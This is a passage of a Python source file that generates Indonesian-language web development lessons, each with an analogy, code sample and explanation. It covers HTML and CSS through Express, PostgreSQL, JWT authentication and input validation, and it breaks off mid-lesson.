"""
Educational seed content generator for LearnWithAcel.

Contains comprehensive curricula and rich, educational Markdown lesson content
for Web Development, Cybersecurity, and Mobile Development roles.
"""

from __future__ import annotations
from typing import Any


def generate_rich_lessons(role_name: str, role_slug: str, level_num: int, module_title: str) -> list[dict[str, Any]]:
    SPECIFIC_CONTENT: dict[str, list[tuple[str, str, str, str, str, str, str]]] = {
        # =====================================================================
        # WEB DEVELOPMENT
        # =====================================================================
        "HTML & CSS Dasar": [
            ("Pengenalan HTML & Struktur Dokumen Web",
             "Membuat web itu seperti membangun rumah. HTML adalah pondasi dan kerangka betonnya.",
             "Tanpa HTML, browser tidak tahu bagaimana merender teks, tombol, atau gambar.",
             "html",
             "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Website Saya</title>\n</head>\n<body>\n  <h1>Halo Dunia!</h1>\n  <p>Selamat datang di kelas HTML.</p>\n</body>\n</html>",
             "- `<!DOCTYPE html>`: Deklarasi standar HTML5.\n- `<html>`: Elemen pembungkus utama.\n- `<head>`: Berisi metadata dan judul halaman.\n- `<body>`: Berisi konten yang tampak di browser.",
             "Gunakan struktur standar HTML5 untuk semua halaman web modern."),

            ("Element, Tag, Attributes & Semantic HTML",
             "Semantic HTML ibarat memberi label 'Dapur' atau 'Kamar Tidur' pada denah rumah.",
             "Meningkatkan SEO di mesin pencari dan mendukung pembaca layar (screen reader) bagi penyandang disabilitas.",
             "html",
             "<header>\n  <nav>\n    <a href=\"/\">Beranda</a>\n  </nav>\n</header>\n<main>\n  <article>\n    <h2>Belajar Semantic HTML</h2>\n    <p>Gunakan tag sesuai fungsinya.</p>\n  </article>\n</main>",
             "- `<header>`: Bagian atas/navigasi website.\n- `<main>`: Konten utama halaman.\n- `<article>`: Konten mandiri seperti postingan blog.",
             "Hindari div-soup! Gunakan tag semantic seperti `<article>`, `<section>`, dan `<nav>`."),

            ("Dasar CSS (Selector, Properties, Box Model)",
             "CSS adalah cat dinding, tirai, dan interior yang mempercantik rumah.",
             "Membuat tampilan web menjadi menarik, rapi, dan nyaman dibaca oleh pengguna.",
             "css",
             "/* Reset Margin & Box Sizing */\n* {\n  box-sizing: border-box;\n  margin: 0;\n}\n\n.card {\n  background-color: #1e293b;\n  color: #f8fafc;\n  padding: 24px;\n  border-radius: 12px;\n  margin: 16px;\n}",
             "- `box-sizing: border-box`: Memastikan padding tidak memperbesar ukuran total elemen.\n- `padding`: Jarak internal dari border ke konten.\n- `margin`: Jarak eksternal ke elemen lain.",
             "Setiap elemen HTML adalah 'Box' yang terdiri dari Content, Padding, Border, dan Margin."),

            ("Flexbox & Layouting Sederhana",
             "Flexbox adalah sistem penataan rak otomatis untuk menyusun elemen secara horizontal atau vertikal.",
             "Memudahkan pembuatan layout responsif seperti navbar, daftar kartu, dan grid fleksibel.",
             "css",
             ".container {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  gap: 16px;\n}",
             "- `display: flex`: Mengaktifkan mode flexbox pada elemen pembungkus.\n- `justify-content: space-between`: Membagi spasi secara rata di antara item.\n- `align-items: center`: Menyelaraskan elemen secara vertikal di tengah.",
             "Gunakan Flexbox untuk komponen satu dimensi (baris atau kolom)."),
        ],

        "Modern JavaScript": [
            ("Variabel & Tipe Data ES6",
             "Variabel adalah label wadah di memori untuk menyimpan data sementara.",
             "ES6 memperkenalkan let dan const untuk cakupan variabel yang lebih aman dan terprediksi.",
             "javascript",
             "const appName = 'LearnWithAcel'; // Nilai tetap\nlet activeUsers = 150;          // Nilai bisa berubah\n\nactiveUsers += 1;\nconsole.log(`${appName} memiliki ${activeUsers} pengguna aktif.`);",
             "- `const`: Digunakan untuk variabel konstanta yang tidak di-reassign.\n- `let`: Digunakan untuk variabel yang nilainya akan diubah di kemudian hari.\n- Template Literals (``): Menggabungkan string dan variabel secara praktis.",
             "Selalu gunakan `const` secara default, gunakan `let` hanya jika nilainya perlu diubah."),

            ("Manipulasi DOM & Event Listener",
             "DOM (Document Object Model) adalah remote control JavaScript untuk mengendalikan elemen HTML.",
             "Memungkinkan web merespons aksi pengguna seperti klik tombol, pengetikan form, dan pergerakan mouse.",
             "javascript",
             "const button = document.querySelector('#btn-submit');\nconst title = document.querySelector('.title');\n\nbutton.addEventListener('click', () => {\n  title.textContent = 'Form Berhasil Dikirim!';\n  title.style.color = '#10b981';\n});",
             "- `querySelector`: Mengambil elemen HTML berdasarkan CSS selector.\n- `addEventListener`: Mendengarkan event seperti 'click', 'submit', atau 'keyup'.\n- `textContent`: Mengubah teks di dalam elemen secara aman.",
             "Pisahkan logika JavaScript dari file HTML agar kode tetap bersih dan modular."),

            ("Asynchronous & Fetch API",
             "Asynchronous ibarat mengambil nomor antrean di restoran: kamu bisa main HP sambil menunggu makanan matang.",
             "Mengambil data dari server eksternal tanpa membuat halaman web membeku (freeze).",
             "javascript",
             "async function fetchUserData(userId) {\n  try {\n    const response = await fetch(`https://api.example.com/users/${userId}`);\n    if (!response.ok) throw new Error('User tidak ditemukan');\n    const data = await response.json();\n    console.log(data);\n  } catch (error) {\n    console.error('Error fetching:', error.message);\n  }\n}",
             "- `async/await`: Menyederhanakan penulisan kode asynchronous agar terasa seperti synchronous.\n- `fetch()`: Mengirim request HTTP asynchronous ke backend API.\n- `try...catch`: Membawa penanganan error secara elegan.",
             "Selalu bungkus `await fetch()` di dalam `try...catch` untuk mengantisipasi kegagalan koneksi."),

            ("Mini Project: Aplikasi To-Do List",
             "Menggabungkan manipulasi DOM, state array sederhana, dan event listener menjadi aplikasi utuh.",
             "Melatih logika dasar manipulasi array data dan merender hasilnya ke layar.",
             "javascript",
             "const todos = [];\n\nfunction addTodo(text) {\n  const newTodo = { id: Date.now(), text, completed: false };\n  todos.push(newTodo);\n  renderTodos();\n}\n\nfunction renderTodos() {\n  const list = document.querySelector('#todo-list');\n  list.innerHTML = todos.map(t => `<li>${t.text}</li>`).join('');\n}",
             "- `todos.push()`: Menambahkan item baru ke array state.\n- `Array.prototype.map()`: Mengubah array objek menjadi deretan tag HTML string.\n- `innerHTML`: Mengganti isi elemen DOM dengan HTML baru.",
             "Pecah aplikasi menjadi fungsi pembantu spesifik: state management, event handler, dan renderer."),
        ],

        "Responsive Design & Git": [
            ("Media Queries & Mobile First Design",
             "Mobile first ibarat merancang barang yang muat di kantong celana sebelum dimasukkan ke dalam koper.",
             "Lebih dari 60% pengakses web menggunakan ponsel pintar; layout harus beradaptasi di segala ukuran layar.",
             "css",
             "/* Style Dasar (Mobile First) */\n.card-grid {\n  display: flex;\n  flex-direction: column;\n  gap: 16px;\n}\n\n/* Desktop Breakpoint */\n@media (min-width: 768px) {\n  .card-grid {\n    flex-direction: row;\n  }\n}",
             "- Mobile First: Menulis CSS utama untuk layar kecil tanpa media query.\n- `@media (min-width: 768px)`: Mengaplikasikan style tambahan khusus saat layar >= 768px.",
             "Gunakan pendekatan Mobile-First untuk CSS yang lebih hemat dan efisien."),

            ("Layouting Lanjutan: CSS Grid vs Flexbox",
             "Flexbox cocok untuk 1 dimensi (baris ATAU kolom), sedangkan Grid cocok untuk 2 dimensi (baris DAN kolom).",
             "Membuat layout kompleks seperti dashboard berita, galeri foto, dan majalah digital secara presisi.",
             "css",
             ".gallery {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\n  gap: 20px;\n}",
             "- `display: grid`: Mengaktifkan container CSS Grid.\n- `repeat(auto-fit, minmax(...))`: Grid otomatis menyesuaikan jumlah kolom sesuai lebar container.",
             "Kombinasikan Grid untuk struktur utama halaman dan Flexbox untuk komponen UI di dalamnya."),

            ("Konsep Git & Version Control Dasar",
             "Git adalah mesin waktu untuk kode programmu. Kamu bisa menyimpan snapshot dan kembali ke versi lama.",
             "Mencegah kehilangan kode, mempermudah pelacakan bug, dan memungkinkan bekerja dalam tim.",
             "bash",
             "# 1. Inisialisasi & Cek Status\ngit init\ngit status\n\n# 2. Simpan Snapshot\ngit add .\ngit commit -m \"feat: tambah komponen navbar responsif\"",
             "- `git init`: Membuat repository Git baru di folder proyek.\n- `git add .`: Memasukkan semua perubahan file ke Staging Area.\n- `git commit`: Menyimpan snapshot permanen ke riwayat Git.",
             "Tulis commit message yang deskriptif menggunakan konvensi Conventional Commits (feat, fix, docs)."),

            ("Workflows Kolaborasi dengan GitHub",
             "GitHub adalah cloud tempat menyimpan repository Git dan berkolaborasi dengan developer lain di seluruh dunia.",
             "Memungkinkan pengembang bekerja secara paralel menggunakan Branch dan Pull Request tanpa bentrok.",
             "bash",
             "# Menghubungkan ke GitHub dan Push Kode\ngit remote add origin https://github.com/user/repo.git\ngit branch -M main\ngit push -u origin main",
             "- `git remote add`: Mengaitkan repository lokal dengan remote server GitHub.\n- `git push`: Mengunggah commit lokal ke GitHub.",
             "Jangan pernah melakukan push langsung ke branch `main` produksi jika bekerja dalam tim; gunakan Feature Branch."),
        ],

        "React.js / Next.js": [
            ("Komponen & Syntax JSX",
             "React menggunakan balok Lego (komponen) untuk menyusun antarmuka aplikasi modern.",
             "Membuat kode UI dapat digunakan kembali (reusable) dan mudah dipelihara.",
             "jsx",
             "function Button({ text, variant = 'primary' }) {\n  return (\n    <button className={`btn btn-${variant}`}>\n      {text}\n    </button>\n  );\n}\n\nexport default function App() {\n  return <Button text=\"Daftar Sekarang\" variant=\"accent\" />;\n}",
             "- JSX (JavaScript XML): Ekstensi sintaks yang menggabungkan struktur HTML di dalam fungsi JavaScript.\n- Props (`{ text }`): Parameter yang dikirim dari induk ke anak komponen.",
             "Buat komponen sekecil dan se-spesifik mungkin agar mudah diuji dan dipakai ulang."),

            ("State & Props (useState Hook)",
             "Props adalah data dari luar (read-only), sedangkan State adalah memori internal komponen yang bisa berubah.",
             "Memungkinkan UI berubah secara interaktif saat ada data baru tanpa perlu me-refresh halaman.",
             "jsx",
             "import { useState } from 'react';\n\nexport default function Counter() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <div className=\"flex gap-4\">\n      <p>Hitungan: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Tambah</button>\n    </div>\n  );\n}",
             "- `useState(0)`: Menginisialisasi state dengan nilai awal 0.\n- `count`: Variabel untuk membaca nilai state saat ini.\n- `setCount`: Fungsi untuk memperbarui state dan memicu re-render UI.",
             "Jangan pernah mengubah state langsung (`count = count + 1`); selalu gunakan fungsi setter `setCount`."),

            ("Lifecycle & Side Effects (useEffect Hook)",
             "useEffect adalah satpam yang menjalankan aksi tertentu setelah komponen selesai digambar di layar.",
             "Digunakan untuk fetching data API, mengelola timer, atau berlangganan event eksternal.",
             "jsx",
             "import { useState, useEffect } from 'react';\n\nexport default function UserList() {\n  const [users, setUsers] = useState([]);\n\n  useEffect(() => {\n    fetch('/api/users')\n      .then(res => res.json())\n      .then(data => setUsers(data));\n  }, []); // Array kosong = jalan 1x saat mount\n}",
             "- `useEffect(fn, [])`: Efek samping yang dipanggil sekali ketika komponen dimuat.\n- Dependency Array `[]`: Menentukan kapan efek samping harus dijalankan ulang.",
             "Pastikan mengisi dependency array dengan benar untuk menghindari bug Infinite Loop."),

            ("Next.js File-Based Routing & SSR",
             "Next.js ibarat gedung apartemen dengan lift otomatis; buat file di folder `app/`, rute langsung tercipta.",
             "Memberikan performa tinggi dengan Server-Side Rendering (SSR) dan SEO teroptimasi.",
             "jsx",
             "// Location: app/blog/[slug]/page.jsx\nexport default async function BlogPost({ params }) {\n  const { slug } = await params;\n  return (\n    <article className=\"prose\">\n      <h1>Membaca Artikel: {slug}</h1>\n    </article>\n  );\n}",
             "- File-based Routing: Struktur folder di dalam `app/` otomatis menjadi URL rute aplikasi web.\n- Server Components: Komponen di-render di server untuk loading awal super cepat.",
             "Gunakan Server Components untuk fetching data dan Client Components (`'use client'`) untuk interaksi UI."),
        ],

        "HTTP & REST API": [
            ("Konsep Protokol HTTP & Request/Response",
             "HTTP ibarat memesan makanan: Client adalah pembeli, Request adalah pesanan, dan Response adalah hidangannya.",
             "Seluruh pertukaran data di internet menggunakan dasar protokol HTTP ini.",
             "text",
             "--- CLIENT REQUEST ---\nGET /api/v1/products HTTP/1.1\nHost: api.learnwithacel.com\nAccept: application/json\n\n--- SERVER RESPONSE ---\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"success\", \"data\": []}",
             "- Request Headers: Informasi tambahan tentang client, format data, dan kredensial.\n- Status Code (200 OK): Indikasi bahwa server berhasil memproses permintaan.",
             "Pahami siklus request-response untuk mempermudah debugging aplikasi backend."),

            ("HTTP Methods (GET, POST, PUT, DELETE)",
             "HTTP Methods menentukan jenis operasi yang ingin kamu lakukan pada sumber daya server.",
             "Memberikan kejelasan standar operasi data (CRUD) antar aplikasi di seluruh dunia.",
             "javascript",
             "// Membaca data (GET)\nfetch('/api/notes');\n\n// Membuat data baru (POST)\nfetch('/api/notes', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ title: 'Catatan Baru' })\n});",
             "- `GET`: Membaca data (idempotent).\n- `POST`: Membuat sumber daya baru di server.\n- `PUT`/`PATCH`: Memperbarui data yang ada.\n- `DELETE`: Menghapus data dari server.",
             "Gunakan HTTP Method sesuai dengan standar semantiknya; jangan gunakan GET untuk mengubah data."),

            ("HTTP Status Codes & Error Handling",
             "Status Code adalah bahasa isyarat server untuk memberitahu hasil pengolahan data.",
             "Memudahkan Frontend merespons kejadian error secara presisi kepada pengembang dan pengguna.",
             "json",
             "/* Response Status: 404 Not Found */\n{\n  \"error\": \"NOT_FOUND\",\n  \"message\": \"Pengguna dengan ID tersebut tidak ditemukan dalam database\",\n  \"timestamp\": \"2026-07-22T12:00:00Z\"\n}",
             "- 2xx (Success): 200 OK, 201 Created.\n- 4xx (Client Error): 400 Bad Request, 401 Unauthorized, 404 Not Found.\n- 5xx (Server Error): 500 Internal Server Error.",
             "Selalu sertakan pesan error yang jelas dalam format JSON konsisten ketika mengembalikan status code 4xx/5xx."),

            ("Desain Endpoint RESTful API yang Clean",
             "REST API mewajibkan aturan penamaan alamat (URI) yang konsisten dan rapi menggunakan kata benda jamak.",
             "Membuat API mudah dipahami oleh pengembang aplikasi lain tanpa perlu membaca dokumentasi panjang.",
             "text",
             "REKOMENDASI ENDPOINT RESTFUL:\n- GET    /api/v1/users        (Ambil semua user)\n- POST   /api/v1/users        (Buat user baru)\n- GET    /api/v1/users/:id    (Ambil 1 user spesifik)\n- DELETE /api/v1/users/:id    (Hapus 1 user spesifik)\n\nHINDARI:\n- GET /api/v1/getAllUsers\n- POST /api/v1/createUser",
             "- Kata Benda Jamak (Nouns): Gunakan `/users`, bukan `/user` atau `/getUsers`.\n- Naming Convention: Gunakan lowercase dan hyphen jika perlu (`/user-profiles`).",
             "Jaga konsistensi struktur response JSON untuk seluruh endpoint API yang kamu buat."),
        ],

        "Node.js & Express": [
            ("Pengenalan Node.js Runtime & NPM",
             "Node.js memungkinkan JavaScript berjalan di luar browser (di dalam server komputer).",
             "Memungkinkan pengembang web menggunakan satu bahasa (JavaScript) untuk frontend dan backend.",
             "javascript",
             "// File: app.js\nconst fs = require('fs');\n\nconsole.log('Mulai membaca file...');\nconst data = fs.readFileSync('info.txt', 'utf-8');\nconsole.log('Isi file:', data);",
             "- Runtime Environment: Node.js mengeksekusi kode JS menggunakan mesin V8 Google Chrome.\n- NPM (Node Package Manager): Ekosistem library pustaka kode terbesar di dunia.",
             "Gunakan `npm init -y` untuk menginisialisasi proyek Node.js baru dengan cepat."),

            ("Membuat HTTP Server dengan Express.js",
             "Express.js adalah framework minimalis dan cepat untuk membangun web server di Node.js.",
             "Menyederhanakan pembuatan server HTTP dibanding modul bawaan Node.js yang verbose.",
             "javascript",
             "const express = require('express');\nconst app = express();\nconst PORT = 3000;\n\napp.get('/', (req, res) => {\n  res.send('Halo dari Express Server!');\n});\n\napp.listen(PORT, () => {\n  console.log(`Server berjalan di http://localhost:${PORT}`);\n});",
             "- `express()`: Inisialisasi aplikasi Express.\n- `app.get()`: Mendefinisikan route handler untuk method GET.\n- `app.listen()`: Menjalankan server pada port tertentu.",
             "Gunakan nodemon selama pengembangan agar server otomatis restart saat kode diubah."),

            ("Routing & Express Middleware Pattern",
             "Middleware adalah pos pemeriksaan (satpam) yang dilewati request sebelum sampai ke handler utama.",
             "Cocok untuk melakukan logging, validasi data, autentikasi, dan manipulasi request.",
             "javascript",
             "const logger = (req, res, next) => {\n  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);\n  next(); // Lanjut ke middleware/route berikutnya\n};\n\napp.use(logger); // Pasang middleware secara global",
             "- `req`: Objek yang berisi informasi HTTP Request.\n- `res`: Objek untuk membalas HTTP Response.\n- `next()`: Fungsi untuk melanjutkan eksekusi ke middleware berikutnya.",
             "Pastikan selalu memanggil `next()` di dalam kustom middleware agar request tidak menggantung."),

            ("Parsing Request Body & Query Parameters",
             "Mengambil parameter dari URL (`req.query`), path URL (`req.params`), atau body JSON (`req.body`).",
             "Memungkinkan server menerima input dinamis dari pengguna.",
             "javascript",
             "app.use(express.json()); // Middleware parsing JSON body\n\napp.post('/api/users', (req, res) => {\n  const { username, email } = req.body;\n  res.status(201).json({ message: 'User berhasil dibuat', data: { username, email } });\n});",
             "- `express.json()`: Middleware wajib untuk membaca payload JSON dari body request.\n- Destructuring (`const { email } = req.body`): Mengambil properti spesifik dari objek.",
             "Selalu validasi tipe data input dari `req.body` sebelum mengolahnya lebih lanjut."),
        ],

        "SQL & PostgreSQL": [
            ("Pengenalan Relational Database & Tabel",
             "Database relasional menyimpan data dalam bentuk tabel terstruktur yang saling berhubungan.",
             "Menjamin konsistensi dan integritas data aplikasi dengan transaksi ACID.",
             "sql",
             "CREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  username VARCHAR(50) UNIQUE NOT NULL,\n  email VARCHAR(100) NOT NULL,\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);",
             "- `PRIMARY KEY`: Kolom identitas unik untuk setiap baris data.\n- `VARCHAR(50)`: Tipe data teks dengan batas maksimal 50 karakter.\n- `NOT NULL`: Memastikan kolom tidak boleh kosong.",
             "Gunakan penamaan tabel jamak (`users`, `orders`) dan lowercase dalam SQL."),

            ("Operasi Dasar CRUD SQL (SELECT, INSERT, UPDATE, DELETE)",
             "CRUD (Create, Read, Update, Delete) adalah 4 operasi dasar pengelolaan data di tabel SQL.",
             "Dibutuhkan di hampir seluruh aplikasi backend untuk menyimpan dan memperbarui informasi.",
             "sql",
             "-- Create & Read\nINSERT INTO users (username, email) VALUES ('acel', 'acel@example.com');\nSELECT * FROM users WHERE email = 'acel@example.com';\n\n-- Update & Delete\nUPDATE users SET username = 'acel_dev' WHERE id = 1;\nDELETE FROM users WHERE id = 1;",
             "- `INSERT INTO`: Menambahkan baris data baru.\n- `SELECT ... WHERE`: Mengambil baris data yang memenuhi kondisi tertentu.\n- `UPDATE ... SET`: Mengubah data pada kolom tertentu.",
             "Hati-hati! Selalu sertakan klausa `WHERE` pada perintah UPDATE dan DELETE agar tidak mengubah seluruh isi tabel."),

            ("Relasi Tabel & Operasi JOIN (INNER, LEFT)",
             "JOIN menggabungkan informasi dari dua atau lebih tabel berdasarkan kolom kunci yang terhubung.",
             "Mencegah duplikasi data dengan memisahkan entitas ke dalam tabel terintegrasi.",
             "sql",
             "SELECT orders.id, users.username, orders.total_amount\nFROM orders\nINNER JOIN users ON orders.user_id = users.id\nWHERE orders.status = 'PAID';",
             "- `FOREIGN KEY`: Kolom di tabel penampung yang merujuk ke PRIMARY KEY tabel induk.\n- `INNER JOIN`: Hanya mengembalikan baris yang memiliki kecocokan di kedua tabel.",
             "Gunakan Index pada kolom Foreign Key untuk mempercepat query JOIN pada data skala besar."),

            ("Desain Skema Database Toko Online",
             "Merancang skema database utuh yang menghubungkan tabel Users, Products, dan Orders.",
             "Pondasi arsitektur data yang menentukan performa dan fleksibilitas aplikasi di masa depan.",
             "sql",
             "CREATE TABLE order_items (\n  id SERIAL PRIMARY KEY,\n  order_id INT REFERENCES orders(id) ON DELETE CASCADE,\n  product_id INT REFERENCES products(id),\n  quantity INT NOT NULL CHECK (quantity > 0),\n  price NUMERIC(10, 2) NOT NULL\n);",
             "- `REFERENCES`: Mendefinisikan hubungan Foreign Key antar tabel.\n- `ON DELETE CASCADE`: Otomatis menghapus detail item saat data induk order dihapus.",
             "Terapkan normalisasi database hingga tingkat 3NF untuk menghindari anomali data."),
        ],

        "Authentication & Security": [
            ("Konsep Autentikasi vs Otorisasi",
             "Autentikasi ibarat menunjukkan KTP (Siapa kamu?), Otorisasi ibarat tiket VIP (Apa wewenangmu?).",
             "Melindungi sistem dari akses tanpa izin dan memastikan privasi pengguna terjaga.",
             "javascript",
             "function authorizeAdmin(req, res, next) {\n  // 1. Cek Autentikasi\n  if (!req.user) return res.status(401).json({ error: 'Harus login terlebih dahulu' });\n  \n  // 2. Cek Otorisasi Role\n  if (req.user.role !== 'ADMIN') return res.status(403).json({ error: 'Akses ditolak: Khusus Admin' });\n  \n  next();\n}",
             "- 401 Unauthorized: Kredensial identitas pengguna tidak valid atau belum login.\n- 403 Forbidden: Identitas valid tetapi pengguna tidak memiliki hak akses.",
             "Pisahkan logika verifikasi identitas (auth) dari cek hak akses peran (RBAC)."),

            ("Keamanan Password dengan Hashing & Bcrypt",
             "Hashing adalah proses satu arah yang merusak teks password menjadi string acak yang tak bisa dikembalikan.",
             "Mencegah kebocoran password mentah jika database berhasil diretas oleh pihak tak bertanggung jawab.",
             "javascript",
             "const bcrypt = require('bcrypt');\n\n// Hashing Password saat Register\nconst saltRounds = 10;\nconst hashedPassword = await bcrypt.hash('passwordRahasia123', saltRounds);\n\n// Verifikasi Password saat Login\nconst isMatch = await bcrypt.compare('passwordRahasia123', hashedPassword);",
             "- `bcrypt.hash()`: Mengenkripsi password dengan algoritma Blowfish dan random salt.\n- `bcrypt.compare()`: Membandingkan password input dengan hash di database tanpa mendeskripsinya.",
             "Jangan pernah menyimpan password mentah (plain-text) di dalam database!"),

            ("Stateless Authentication dengan JSON Web Token (JWT)",
             "JWT ibarat paspor digital bertanda tangan kriptografi yang dibawa oleh client pada setiap request.",
             "Memungkinkan backend mengautentikasi pengguna secara stateless tanpa menyimpan sesi di database server.",
             "javascript",
             "const jwt = require('jsonwebtoken');\nconst SECRET_KEY = process.env.JWT_SECRET;\n\n// Generate Token\nconst token = jwt.sign({ userId: user.id, role: user.role }, SECRET_KEY, { expiresIn: '2h' });\n\n// Verifikasi Token\nconst decodedPayload = jwt.verify(token, SECRET_KEY);",
             "- Header, Payload, Signature: Tiga bagian utama pendukung integritas data JWT.\n- `expiresIn: '2h'`: Membatasi masa berlaku token demi alasan keamanan.",
             "Jangan pernah meletakkan informasi sensitif (seperti password atau nomor kartu kredit) di dalam payload JWT."),

            ("Pengamanan API: CORS & Rate Limiting",
             "CORS mengatur domain mana yang boleh memanggil API-mu, sedangkan Rate Limiting mencegah spam request.",
             "Melindungi server dari serangan Denial of Service (DoS) dan pencurian data antar domain.",
             "javascript",
             "const cors = require('cors');\nconst rateLimit = require('express-rate-limit');\n\napp.use(cors({ origin: 'https://learnwithacel.com' }));\n\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 menit\n  max: 100 // maksimal 100 request per IP\n});\napp.use('/api/', limiter);",
             "- `cors()`: Mengatur response header `Access-Control-Allow-Origin`.\n- `rateLimit`: Membatasi jumlah panggilan API dari IP yang sama dalam kurun waktu tertentu.",
             "Aktifkan CORS ketat di produksi dan pasang rate limiter pada endpoint sensitif seperti `/login`."),
        ],

        "HTML, CSS & JS": [
            ("Integrasi Fondasi Frontend",
             "Menyatukan struktur HTML, tampilan CSS, dan logika interaktif JavaScript dalam satu proyek utuh.",
             "Landasan dasar yang wajib dikuasai sebelum mengadopsi framework modern seperti React atau Vue.",
             "html",
             "<!DOCTYPE html>\n<html>\n<head>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <button id=\"counter-btn\">Klik: 0</button>\n  <script src=\"app.js\"></script>\n</body>\n</html>",
             "- `<link rel=\"stylesheet\">`: Menghubungkan file CSS eksternal.\n- `<script src=\"...\">`: Menghubungkan file JavaScript eksternal di akhir body.",
             "Selalu tempatkan tag script di akhir body atau gunakan atribut `defer` agar tidak memblokir render HTML."),

            ("Manipulasi DOM Interaktif",
             "Menggunakan JavaScript untuk memperbarui konten HTML dan merespons interaksi pengguna secara real-time.",
             "Memberikan pengalaman pengguna (UX) yang responsif dan memikat.",
             "javascript",
             "let count = 0;\nconst btn = document.getElementById('counter-btn');\n\nbtn.addEventListener('click', () => {\n  count++;\n  btn.textContent = `Klik: ${count}`;\n  btn.classList.toggle('active', count % 2 === 0);\n});",
             "- `classList.toggle()`: Menambah atau menghapus class CSS secara dinamis.\n- Event Handling: Memproses klik tombol untuk mengubah teks internal.",
             "Manfaatkan class CSS untuk perubahan visual daripada merubah `element.style` langsung di JavaScript."),

            ("Menghubungkan Web ke API Eksternal",
             "Mengambil data dinamis dari backend server menggunakan `fetch` dan merendernya ke antarmuka web.",
             "Memungkinkan web menampilkan informasi terbaru secara dinamis dari database server.",
             "javascript",
             "async function loadProducts() {\n  const res = await fetch('/api/products');\n  const products = await res.json();\n  const container = document.getElementById('products');\n  container.innerHTML = products.map(p => `<div class=\"card\">${p.name}</div>`).join('');\n}",
             "- JSON parsing: Mengubah string format data dari server menjadi objek JavaScript.\n- Dynamic rendering: Menyusun HTML dari daftar data array.",
             "Tampilkan indikator loading (spinner) saat proses pengambilan data API berlangsung."),

            ("Aplikasi Web Interaktif Sederhana",
             "Membangun aplikasi Catatan Interaktif dengan fitur tambah, hapus, dan filter data.",
             "Menguji kemampuan integrasi HTML, CSS, JavaScript DOM, dan penyimpanan lokal browser (localStorage).",
             "javascript",
             "function saveNote(note) {\n  const notes = JSON.parse(localStorage.getItem('notes') || '[]');\n  notes.push(note);\n  localStorage.setItem('notes', JSON.stringify(notes));\n}",
             "- `localStorage`: Menyimpan data sederhana di browser pengguna yang tidak hilang saat refresh.\n- `JSON.stringify`/`JSON.parse`: Mengonversi objek JavaScript ke string dan sebaliknya.",
             "Gunakan `localStorage` untuk menyimpan preferensi ringan seperti Tema Gelap/Terang."),
        ],

        "Node.js & PostgreSQL": [
            ("Arsitektur Backend Fullstack",
             "Merancang arsitektur aplikasi backend yang modular, mudah diuji, dan skalabel.",
             "Memudahkan pemeliharaan kode saat proyek berkembang dari skala kecil hingga aplikasi enterprise.",
             "text",
             "STRUKTUR FOLDER BACKEND:\nsrc/\n├── controllers/   # Logika penanganan HTTP request\n├── services/      # Logika bisnis utama\n├── models/        # Skema data & interaksi database\n└── routes/        # Rute & endpoint API",
             "- Separation of Concerns: Memisahkan tanggung jawab setiap lapisan kode.\n- Controller: Hanya bertugas menerima masukan dan membalas keluaran HTTP.",
             "Jangan mencampur logika query database langsung di dalam file routing."),

            ("Koneksi Database Node.js dengan Prisma / PG",
             "Menggunakan Prisma ORM untuk berinteraksi dengan database PostgreSQL menggunakan Object-Oriented JS/TS.",
             "Memberikan Type-Safety dan auto-completion saat melakukan query ke database PostgreSQL.",
             "javascript",
             "const { PrismaClient } = require('@prisma/client');\nconst prisma = new PrismaClient();\n\nasync function main() {\n  const allUsers = await prisma.user.findMany({\n    include: { progress: true }\n  });\n  console.log(allUsers);\n}",
             "- `PrismaClient`: Client ORM otomatis yang dibuat berdasarkan skema database `schema.prisma`.\n- `findMany({ include: ... })`: Query mengambil data relasi secara deklaratif tanpa menulis JOIN manual.",
             "Manfaatkan fitur auto-migration dari ORM untuk mengelola perubahan skema database secara terstruktur."),

            ("Service & Controller Pattern",
             "Pola desain untuk memisahkan logika HTTP (Controller) dari logika bisnis utama aplikasi (Service).",
             "Membuat kode bisnis dapat dipanggil ulang di tempat lain (misalnya CLI atau background worker).",
             "javascript",
             "// UserService.js\nasync function createUser(data) {\n  // Logika bisnis: hashing password, cek email duplikat\n  return await prisma.user.create({ data });\n}\n\n// UserController.js\nasync function handleRegister(req, res) {\n  const user = await createUser(req.body);\n  res.status(201).json(user);\n}",
             "- Service Layer: Tempat menaruh logika enkripsi, kalkulasi transaksi, dan aturan bisnis.\n- Controller Layer: Bertugas memvalidasi `req.body` dan mengirim status code response HTTP.",
             "Selalu bungkus controller dengan error handler terpusat agar tidak ada error tak terduga yang lolos."),

            ("Validasi & Sanitasi Data Input",
             "Memeriksa dan membersihkan semua data yang masuk dari pengguna sebelum diproses oleh database.",
             "Mencegah serangan SQL Injection, Cross-Site Scripting (XSS), dan data kotor di database.",
             "javascript",
             "const { z } = require('zod');\n\nconst UserSchema = z.object({\n  username: z.string().min(3).max(20),\n  email: z.string().email(),\n  age: z.number().min(18)\n});\n\nconst validatedData = UserSchema.parse(req.body);",
             "- Zod Library: Schema declaration and validation library untuk TypeScript & JavaScript.\n- `.parse()`: Melempar error otomatis jika struktur data input tidak sesuai aturan schema.",
             "Jangan pernah mempercayai input dari client; selalu lakukan validasi ketat di sisi backend."),
        ],

        "REST API & Integration": [
            ("Menghubungkan React dengan Express Backend",
             "Integrasi penuh antara aplikasi antarmuka React di frontend dengan server Express di backend.",
             "Mewujudkan aplikasi Fullstack web yang dinamis dan berinteraksi secara real-time.",
             "jsx",
             "// Frontend React Component\nimport { useState, useEffect } from 'react';\n\nexport default function ProductList() {\n  const [items, setItems] = useState([]);\n  \n  useEffect(() => {\n    fetch('http://localhost:5000/api/v1/products')\n      .then(res => res.json())\n      .then(data => setItems(data));\n  }, []);\n}",
             "- Client-Side Fetching: Memanggil endpoint REST API backend saat komponen React dimuat.\n- State Synchronization: Menyimpan data kiriman backend ke dalam state local React.",
